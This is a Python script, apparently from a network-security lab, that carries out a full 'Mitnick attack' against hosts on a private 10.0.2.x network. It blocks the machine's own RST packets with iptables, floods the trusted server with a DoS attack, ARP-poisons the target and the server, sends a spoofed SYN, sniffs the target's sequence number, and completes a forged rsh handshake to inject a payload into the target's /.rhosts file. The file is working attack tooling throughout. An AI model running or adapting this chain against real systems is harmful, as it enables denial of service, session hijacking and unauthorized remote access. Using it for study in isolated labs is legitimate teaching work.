import threading
import sys
import time
import subprocess
from attack.dos import start_dos_attack, stop_dos_attack
from attack.ip_spoofing import send_spoofed_syn, complete_handshake_and_inject
from attack.sniffer import sniff_for_syn_ack
from attack.arp_spoof import start_bidirectional_arpspoof, stop_arpspoof

# --- Configuration ---
TRUSTED_SERVER_IP = "10.0.2.30"
TARGET_IP = "10.0.2.20"
RSH_PORT = 514
CLIENT_PORT = 1023
INTERFACE = "eth0"

def run_command(command):
    """Helper to run a shell command."""
    print(f"[+] Running: {' '.join(command)}")
    try:
        subprocess.run(command, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running command: {e}\nStderr: {e.stderr}")
        raise

def setup_rst_block():
    """Block outgoing RST packets from our kernel."""
    print("\n[+] Blocking outgoing RST packets to prevent kernel interference.")
    run_command(["iptables", "-A", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-j", "DROP"])

def cleanup_rst_block():
    """Remove the iptables rule that blocks RST packets."""
    print("\n[+] Cleaning up iptables rules...")
    try:
        run_command(["iptables", "-D", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-j", "DROP"])
    except subprocess.CalledProcessError:
        print("[-] Warning: Failed to remove iptables rule. It might not have been set.")

def dos_thread_func(target_ip, target_port, stop_event):
    """Function to run the DoS attack in a separate thread."""
    process = start_dos_attack(target_ip, target_port)
    stop_event.wait()
    stop_dos_attack(process)

def sniffer_thread_func(target_ip, server_ip, client_port, results_list):
    """Wrapper to run the sniffer and store the captured ISN."""
    isn = sniff_for_syn_ack(target_ip, server_ip, client_port)
    if isn is not None:
        results_list.append(isn)

def main():
    """Main function to orchestrate the Mitnick attack."""
    print("--- Starting Mitnick Attack ---")
    stop_dos_event = threading.Event()
    dos_thread = None
    arpspoof_processes = None

    try:
        # 0. Block our kernel's RST packets
        setup_rst_block()

        # 1. Start DoS attack in the background
        dos_thread = threading.Thread(target=dos_thread_func, args=(TRUSTED_SERVER_IP, RSH_PORT, stop_dos_event))
        dos_thread.daemon = True
        dos_thread.start()
        print("\n[Step 1] DoS attack running in the background.")
        time.sleep(1)

        # 2. Start Bidirectional ARP Poisoning to isolate target and server
        arpspoof_processes = start_bidirectional_arpspoof(TARGET_IP, TRUSTED_SERVER_IP, INTERFACE)
        print("\n[Step 2] Bidirectional ARP spoofing running in the background.")
        time.sleep(2) # Give arpspoof a moment to take effect

        # 3. Start the sniffer to capture the redirected SYN/ACK
        print("\n[Step 3] Starting network sniffer...")
        captured_isn_list = []
        sniffer_thread = threading.Thread(target=sniffer_thread_func, args=(TARGET_IP, TRUSTED_SERVER_IP, CLIENT_PORT, captured_isn_list))
        sniffer_thread.start()
        time.sleep(1)

        # 4. Send the spoofed SYN to trigger the response
        print("\n[Step 4] Sending spoofed SYN packet...")
        my_isn = send_spoofed_syn(TARGET_IP, TRUSTED_SERVER_IP, CLIENT_PORT, RSH_PORT)
        
        sniffer_thread.join() # Wait for sniffer to finish

        if captured_isn_list:
            target_isn = captured_isn_list[0]
            print(f"\n[+] Success! Captured Target ISN: {target_isn}")
            
            # 5. Complete the handshake and inject the payload
            complete_handshake_and_inject(TARGET_IP, TRUSTED_SERVER_IP, CLIENT_PORT, RSH_PORT, my_isn, target_isn)
            print("\n[+] Attack payload injected. Check the target's /.rhosts file.")
        else:
            print("\n[-] Failed to capture ISN. Attack failed.")

        print('\nType "exit" to stop background processes and terminate.')
        for line in sys.stdin:
            if line.strip().lower() == 'exit':
                break

    except KeyboardInterrupt:
        print("\nCtrl+C received, shutting down.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        if arpspoof_processes:
            stop_arpspoof(arpspoof_processes)
        cleanup_rst_block()
        if dos_thread and dos_thread.is_alive():
            print("Stopping DoS attack...")
            stop_dos_event.set()
            dos_thread.join()
        print("\n--- Attack Finished ---")

if __name__ == "__main__":
    main()
